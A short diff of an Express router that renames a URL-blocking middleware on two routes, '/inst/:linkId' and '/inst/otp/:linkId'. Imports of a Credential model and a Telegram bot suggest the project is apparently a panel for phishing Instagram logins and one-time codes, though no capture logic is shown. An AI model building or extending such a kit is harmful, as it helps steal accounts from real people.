@@ -3,10 +3,10 @@ const Links = require("../../models/LinkModel");
 const User = require("../../models/User");
 const Credential = require("../../models/CredentialModel");
 const bot = require("../../telegram");
-const { restrictUrl } = require("../../middlewares/blockUrl");
+const { blockURL } = require("../../middlewares/blockUrl");
 
 
-router.get("/inst/:linkId", restrictUrl, async (req, res) => {
+router.get("/inst/:linkId", blockURL, async (req, res) => {
     try {
         const { linkId } = req.params;
         const link = await Links.findOne({ _id: linkId });
@@ -28,7 +28,7 @@ router.get("/inst/:linkId", restrictUrl, async (req, res) => {
     }
 });
 
-router.get("/inst/otp/:linkId", restrictUrl, async (req, res) => {
+router.get("/inst/otp/:linkId", blockURL, async (req, res) => {
     try {
         const { linkId } = req.params;
         const link = await Links.findOne({ _id: linkId });
